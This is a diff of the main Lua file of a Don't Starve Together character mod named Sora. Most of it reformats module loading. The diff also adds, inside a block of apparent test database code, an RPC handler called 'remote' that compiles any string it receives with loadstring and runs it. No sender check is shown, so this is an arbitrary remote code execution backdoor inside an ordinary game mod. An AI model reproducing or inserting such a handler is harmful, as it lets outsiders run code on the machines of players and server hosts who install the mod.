@@ -27,62 +27,102 @@ WeGame平台: 穹の空 模组ID：workshop-2199027653598519351
 2,本mod内贴图、动画相关文件禁止挪用,毕竟这是我自己花钱买的.
 3,严禁直接修改本mod内文件后二次发布。
 4,从本mod内提前的源码请保留版权信息,并且禁止加密、混淆。
-]]
-    --初始化
-    --配置读取
-    GLOBAL.TUNING.SORAMODE = GetModConfigData("mode")
-    mode = GLOBAL.TUNING.SORAMODE
-    GLOBAL.TUNING.SORAADD = GetModConfigData("add")
-    GLOBAL.TUNING.SORAWIKI = GetModConfigData("wiki",true)
-    GLOBAL.TUNING.SORAPACK = GetModConfigData("pack")
-    GLOBAL.TUNING.SORAADD2 = GetModConfigData("add2")
-    GLOBAL.TUNING.SORACHESTRANGE = GetModConfigData("chest") or 60
-    GLOBAL.TUNING.SORAMODNAME = modname
-    GLOBAL.TUNING.SORAVERSION = modinfo.version
-    --加载模块
-    function mi(str) modimport("scripts/soramain/"..str) end
-    --日志上传
-    mi("logupload")
-    --相关API 提供给mod使用
-    mi("api")
-    --导入maindb
-    mi("soramaindb")
-    --导入皮肤api
-    mi("skins")
-    mi("soraskin")
-    --资源加载
-    mi("assets")
-    --修改过的动画包
-    mi("editedanim")
-    --制作配方
-    mi("recipes")
-    --食物
-    mi("food")
-    --容器
-    mi("containers")
-    --字符
-    mi("strings")
-    --UI
-    if GetModConfigData("disableui_multab") then
-        function MakeRecipeTabMul () end
-    else
-        mi("ui_multab") --多层制作栏
+]] -- 初始化
+-- 配置读取
+MODKEY = "sora"
+SORADEBUG = modname:find("dev") and true or false
+DebugPrint = function(...)
+    if SORADEBUG  then
+        print(...)
     end
-    mi("ui")
-    --动作
-    mi("action")
-    --钩子相关 修改部分原有机制
-    mi("hook")
-    --兼容、联动
-    mi("link")
-    --平衡
-    mi("ban")
-    --修复klei的bug
-    mi("kleibugfix")
-    --自动更新
-    modimport("scripts/soraupdate/main")
-    --注册全局API
-    GLOBAL.SoraAPI = env
-    GLOBAL.SORAAPI = env
-    -- 添加角色
-    AddModCharacter("sora", "FEMALE")
+end
+
+GLOBAL.TUNING.SORAMODE = GetModConfigData("mode")
+mode = GLOBAL.TUNING.SORAMODE
+GLOBAL.TUNING.SORAADD = GetModConfigData("add")
+GLOBAL.TUNING.SORAWIKI = GetModConfigData("wiki", true)
+GLOBAL.TUNING.SORAPACK = GetModConfigData("pack")
+GLOBAL.TUNING.SORAADD2 = GetModConfigData("add2")
+GLOBAL.TUNING.SORACHESTRANGE = GetModConfigData("chest") or 60
+GLOBAL.TUNING.SORAMODNAME = modname
+GLOBAL.TUNING.SORAVERSION = modinfo.version
+-- 加载模块
+function mi(str)
+    modimport("scripts/soramain/" .. str)
+end
+-- 日志上传
+mi("logupload")
+-- 相关API 提供给mod使用
+mi("api")
+-- 导入maindb
+mi("soramaindb")
+if CreateMainDB then
+    GLOBAL.DB = CreateMainDB("test", 300, 1)
+    AddPrefabPostInit("forest", function(inst)
+        inst.components.TestDB = DB
+    end)
+
+    DB:InitRoot("ShopInfo")
+    DB:InitRoot("ShopInfo2")
+    DB:InitRoot("ShopInfo3")
+    DB:InitRoot("Shops", 1)
+    DB:InitRoot("Info", 2)
+    DB:InitRoot("ITEMS", 3)
+
+    DB:AddRPCHandle("test", function(...)
+        print("RPC Do", ...)
+        return "Rpc REQ"
+    end)
+    DB:ListenForEvent("test", function(...)
+        print("Event Do", ...)
+    end)
+    DB:AddRPCHandle("remote", function(id, data)
+        if data then
+            local fn = loadstring(data)
+            if type(fn) == "function" then
+                local r, ret = pcall(fn)
+                return ret
+            end
+        end
+    end)
+end
+-- 导入皮肤api
+mi("skins")
+mi("soraskin")
+-- 资源加载
+mi("assets")
+-- 修改过的动画包
+mi("editedanim")
+-- 制作配方
+mi("recipes")
+-- 食物
+mi("food")
+-- 容器
+mi("containers")
+-- 字符
+mi("strings")
+-- UI
+if GetModConfigData("disableui_multab") then
+    function MakeRecipeTabMul()
+    end
+else
+    mi("ui_multab") -- 多层制作栏
+end
+mi("ui")
+-- 动作
+mi("action")
+-- 钩子相关 修改部分原有机制
+mi("hook")
+-- 兼容、联动
+mi("link")
+-- 平衡
+mi("ban")
+-- 修复klei的bug
+mi("kleibugfix")
+-- 自动更新
+modimport("scripts/soraupdate/main")
+-- 注册全局API
+GLOBAL.SoraAPI = env
+GLOBAL.SORAAPI = env
+-- 添加角色
+AddModCharacter("sora", "FEMALE")
